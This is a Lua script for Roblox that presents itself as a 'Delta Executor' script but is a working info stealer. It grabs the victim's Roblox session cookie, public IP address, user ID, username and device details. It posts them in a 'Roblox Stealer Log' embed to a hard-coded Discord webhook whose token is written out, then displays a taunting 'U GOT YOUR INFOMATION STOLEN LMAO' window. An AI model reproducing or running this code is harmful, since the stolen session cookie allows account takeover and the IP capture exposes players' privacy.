-- Delta Executor (PC & Mobile) – Stable version, no date errors
local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"

local function sendData(url, jsonPayload)
    local headers = {["Content-Type"] = "application/json"}
    local success, response = pcall(function()
        return request({Url = url, Method = "POST", Headers = headers, Body = jsonPayload})
    end)
    if success and response then return true end
    success, response = pcall(function()
        return http_request({Url = url, Method = "POST", Headers = headers, Body = jsonPayload})
    end)
    return success and response
end

local function getInfo()
    local info = {}
    info.executor = getexecutorname and getexecutorname() or "Delta"
    local player = game.Players.LocalPlayer
    if player then
        info.userId = tostring(player.UserId)
        info.userName = player.Name
        info.displayName = player.DisplayName
    end
    info.placeId = tostring(game.PlaceId)
    info.jobId = game.JobId
    local ipOk, ip = pcall(function()
        return game:GetService("HttpService"):GetAsync("https://api.ipify.org")
    end)
    info.ip = ipOk and ip or "N/A"
    local cookieOk, cookieVal = pcall(function()
        return getcookie("https://www.roblox.com/")
    end)
    info.cookie = cookieOk and cookieVal or "Not available"
    pcall(function()
        info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
        info.platform = tostring(game:GetService("UserInputService").Platform)
    end)
    return info
end

local function buildEmbed(data)
    local fields = {}
    for key, value in pairs(data) do
        table.insert(fields, {name = key, value = value, inline = true})
    end
    -- No timestamp to avoid date errors
    return {
        embeds = {{
            title = "Roblox Stealer Log",
            color = 0xFF0000,
            fields = fields,
            footer = { text = "Delta Executor" }
        }}
    }
end

local collected = getInfo()
local embedPayload = buildEmbed(collected)
local jsonString = game:GetService("HttpService"):JSONEncode(embedPayload)
sendData(webhook, jsonString)

-- Simple GUI (no animations, no complex styling)
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 150)
frame.Position = UDim2.new(0.5, -200, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
frame.BackgroundTransparency = 0.2
frame.Parent = screenGui

-- Simple border using a second frame
local border = Instance.new("Frame")
border.Size = UDim2.new(1, -6, 1, -6)
border.Position = UDim2.new(0, 3, 0, 3)
border.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
border.BackgroundTransparency = 0.6
border.BorderSizePixel = 0
border.Parent = frame

local label = Instance.new("TextLabel")
label.Size = UDim2.new(1, 0, 1, -50)
label.Position = UDim2.new(0, 0, 0, 10)
label.BackgroundTransparency = 1
label.Text = "U GOT YOUR INFOMATION STOLEN LMAO"
label.TextColor3 = Color3.fromRGB(255, 0, 0)
label.TextScaled = true
label.Font = Enum.Font.GothamBold
label.TextWrapped = true
label.Parent = frame

local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 100, 0, 35)
closeButton.Position = UDim2.new(0.5, -50, 1, -45)
closeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
closeButton.Text = "Close"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.TextScaled = true
closeButton.Font = Enum.Font.Gotham
closeButton.Parent = frame

closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)
